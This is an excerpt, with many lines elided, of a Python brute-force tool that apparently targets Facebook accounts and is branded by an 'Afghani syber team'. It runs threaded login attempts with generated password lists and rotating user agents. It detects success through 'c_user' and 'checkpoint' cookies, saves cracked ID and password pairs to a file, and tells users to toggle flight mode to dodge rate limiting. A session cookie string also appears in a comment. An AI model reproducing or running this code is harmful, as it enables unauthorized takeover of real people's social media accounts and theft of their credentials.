...
syed =['Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36',]
logo=("""\033[1;97m
...
>>  Github    : BROTHER-TECH-10
>>  Facebook : Roohullah Afghan
>>  Version  : 0.1
>>  Team❤    : Afghani syber team
--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> Afghani syber TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/UMAIR.txt')
				linex()
				...
				os.system(f'xdg-open https://www.facebook.com/profile.php?id=100078200314191');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Roohullah / Afghan] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			UMAIR=session.cookies.get_dict().keys()
			if "c_user" in UMAIR:
				print('\r\r\033[1;31m[AFG-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/AFG-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in UMAIR:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[AFG-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Roohullah/ Afghan] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in UMAIR:
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[AFG-CP] '+ids+' | '+pas+'\033[1;97m')
...
def random_number1():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		print('\x1b[1;91m[*] If No Result Use Flight Mode 5 Seconds ')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode]
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mRoohullah / Afghan\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    # 'cookie': 'datr=J93pY-LoF-0a2y1PNRrtjquu; sb=J93pY8wZqhV4U7IVBPBgBe-d; m_pixel_ratio=3; dnonce=AWngg7_wduSnFnVYZApC__AKc4QwnspkpH341MLBY7B2pfM5BCffDKID8n-MyqppWivxoCf1kTYN8a1TdlCmwt08; wd=360x598; fr=0yrmrCrwy2kjfJi4c..Bj6d0n.Sg.AAA.0.0.Bj6d2a.AWX_7IzqNA0',
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[AFG-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[AFG-OK] '+cid+' | '+ps+'\33[0;97m')
